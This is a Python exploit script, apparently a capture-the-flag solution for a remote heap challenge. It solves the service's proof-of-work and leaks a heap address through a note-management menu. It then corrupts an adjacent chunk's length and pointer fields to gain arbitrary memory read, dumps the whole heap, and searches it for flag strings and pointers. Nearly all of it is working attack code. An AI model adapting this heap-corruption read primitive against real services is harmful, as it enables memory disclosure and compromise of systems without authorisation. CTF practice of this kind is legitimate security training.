#!/usr/bin/env python3
"""Step3: full-heap scan (arbitrary read) for flag content + collect pointers; dump startup struct."""
import hashlib, itertools, re, socket, string, sys, time, struct

HOST = sys.argv[1] if len(sys.argv) > 1 else "env.xj.edisec.net"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 30410
p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)
u64 = lambda b: struct.unpack("<Q", b.ljust(8, b"\x00"))[0]


def drain(s, wait=0.8, bufsize=262144):
    s.settimeout(0.2)
    buf = b""
    end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(bufsize)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]
    fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        if hashlib.md5("".join(fixed).encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


class C:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=8)
        b = drain(self.s, 1.5)
        masked = re.search(rb"Token:\s*([A-Za-z_]+)", b).group(1).decode()
        md5hex = re.search(rb"MD5:\s*([0-9a-f]{32})", b).group(1).decode()
        print("[pow] %s -> %s" % (masked, solve_pow(md5hex, masked)), flush=True)
        self.send(solve_pow(md5hex, masked), 1.2)

    def send(self, line, wait=0.7):
        line = str(line)
        try:
            self.s.sendall(line.encode() + b"\n")
        except OSError:
            return b""
        return drain(self.s, wait)

    def create(self, idx, title, reserve, length, hexdata):
        self.send(1); self.send(idx); self.send(title); self.send(reserve); self.send(length)
        return self.send(hexdata, 0.9)

    def edit(self, idx, length, hexdata, wait=0.9):
        self.send(2); self.send(idx); self.send(length); return self.send(hexdata, wait)

    def show(self, idx, wait=1.0):
        self.send(3); return self.send(idx, wait)

    def pack(self, idx):
        self.send(4); return self.send(idx)


def parse(r):
    m = re.search(rb"len=(\d+) cap=(\d+)\n([0-9a-f]*)\n", r)
    return (int(m.group(1)), int(m.group(2)), bytes.fromhex(m.group(3).decode())) if m else None


c = C(HOST, PORT)
c.create(0, "A", 512, 512, "41" * 512); c.pack(0)
c.create(1, "B", 32, 32, "42" * 32)
c.create(2, "C", 32, 32, "43" * 32)
c.create(3, "D", 32, 32, "44" * 32)
d = None
for _ in range(4):
    d = parse(c.show(0, wait=1.4))
    if d:
        break
if not d:
    print("[setup] show(0) parse failed; aborting to avoid bad state", flush=True)
    c.s.close()
    sys.exit(1)
A_USER = u64(d[2][0x30:0x38]) - 0x60
top = u64(d[2][0x168:0x170])
heap_end = A_USER + 0x160 + (top & ~0xf)
heap_start = heap_end - 0x21000
print("[setup] A_user=0x%x heap=[0x%x,0x%x]" % (A_USER, heap_start, heap_end), flush=True)


def arb_read(addr, n):
    p = bytearray(b"\x00" * 0x38)
    p[0x18:0x20] = p64(0x41)
    p[0x20:0x28] = p64(n); p[0x28:0x30] = p64(n); p[0x30:0x38] = p64(addr)
    c.edit(0, 0x38, p.hex())
    r = c.show(1, wait=1.2 + n / 8000.0)
    dd = parse(r)
    if not dd or len(dd[2]) < n:
        print("[arb_read 0x%x n=%d] FAIL %r" % (addr, n, r[:100]), flush=True)
        return None
    return dd[2][:n]


# full heap scan
blob = b""
STEP = 0x4000
addr = heap_start
while addr < heap_end:
    n = min(STEP, heap_end - addr)
    chunk = arb_read(addr, n)
    if chunk is None:
        print("  [scan stop @0x%x]" % addr, flush=True)
        break
    blob += chunk
    addr += n
print("[scan] read %d bytes of heap" % len(blob), flush=True)

for m in re.finditer(rb"[Ff][Ll][Aa][Gg][A-Za-z_{]:}", blob):
    print("  FLAGISH @0x%x: %r" % (heap_start + m.start(), blob[max(0, m.start() - 16):m.start() + 96]), flush=True)
print("  all 'flag' occurrences:", [hex(heap_start + m.start()) for m in re.finditer(rb"[Ff][Ll][Aa][Gg]", blob)], flush=True)

# pointer census
ptrs = {}
for i in range(0, len(blob) - 8, 8):
    q = u64(blob[i:i + 8])
    if 0x10000 < q < 0x800000000000:
        ptrs.setdefault(q, 0)
        ptrs[q] += 1
interesting = sorted(ptrs)
print("  distinct ptr-like (%d), sample:" % len(interesting), flush=True)
for q in interesting[:60]:
    tag = ""
    if heap_start <= q < heap_end:
        tag = " HEAP+0x%x" % (q - heap_start)
    print("    0x%x x%d%s" % (q, ptrs[q], tag), flush=True)

# raw hex of startup struct region
print("\n[startup raw 0x90a0..0x9340]", flush=True)
base = heap_start
for off in range(0x0a0, 0x340, 16):
    print("   +0x%03x  %s" % (off, blob[off:off + 16].hex()), flush=True)
c.s.close()